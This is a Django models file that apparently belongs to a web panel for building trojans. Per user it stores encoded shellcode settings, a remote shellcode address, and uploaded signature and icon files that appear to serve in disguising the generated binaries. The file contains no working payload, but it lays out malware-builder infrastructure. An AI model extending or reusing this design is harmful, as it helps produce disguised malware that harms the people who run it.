from django.db import models
from django.conf import settings
import os
import uuid
# Create your models here.


def user_directory_path(instance, filename):
    # 打开文件以读取其内容
    base, ext = os.path.splitext(filename)
    new_filename = f"{uuid.uuid4().hex[:10]}_{base}{ext}"
    return os.path.join("uploads", "signatures_and_icons", new_filename)



class TrojanList(models.Model):
    id = models.AutoField(primary_key=True)
    user = models.ForeignKey(settings.AUTH_USER_MODEL, on_delete=models.CASCADE, related_name='trojan_created_files')
    chosen_plan = models.CharField(max_length=20, verbose_name="chosen_plan")
    encode_key = models.CharField(max_length=64, verbose_name="encode_key")
    shellcode_remote = models.BooleanField(default=False, verbose_name="shellcode _remote")
    shellcode_remote_addr = models.CharField(max_length=256, null=True, verbose_name="shellcode_remote_addr")
    notes = models.TextField(blank=True, null=True, verbose_name="notes")
    created_at = models.DateTimeField(auto_now_add=True, verbose_name="creat_at")
    file_hash = models.CharField(max_length=64, blank=True, null=True, verbose_name="file_hash")
    signature_file = models.FileField(upload_to=user_directory_path, null=True, blank=True) # 上传签名文件字段
    icon_file = models.FileField(upload_to=user_directory_path, null=True, blank=True) # 上传图标文件字段
    shellcode_file_name = models.CharField(max_length=256, verbose_name="shellcode_file_name")


    def __str__(self):
        return f"{self.chosen_plan} - {self.id}"